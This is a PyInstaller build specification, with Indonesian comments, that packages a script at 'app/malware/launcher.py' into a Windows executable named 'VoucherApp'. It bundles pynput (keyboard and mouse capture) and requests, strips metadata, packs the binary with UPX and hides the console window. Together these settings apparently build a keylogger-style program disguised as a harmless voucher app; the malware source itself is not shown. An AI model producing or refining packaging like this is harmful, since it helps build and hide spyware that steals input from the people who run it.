# -*- mode: python ; coding: utf-8 -*-
from PyInstaller.utils.hooks import collect_submodules

block_cipher = None

# Import otomatis semua submodule yang diperlukan
hiddenimports = (
    collect_submodules('pynput') +
    collect_submodules('requests') +
    collect_submodules('tkinter')
)

a = Analysis(
    ['app/malware/launcher.py'],       # ✅ Entry point
    pathex=['.'],                      # Jalankan dari voucher_web/
    binaries=[],
    datas=[],
    hiddenimports=hiddenimports,
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='VoucherApp',                 # ✅ Nama file output
    debug=False,
    strip=True,                        # ✅ Hilangkan metadata debug
    upx=True,                          # ✅ Gunakan UPX jika tersedia
    console=False                      # ✅ Tidak buka jendela terminal
)
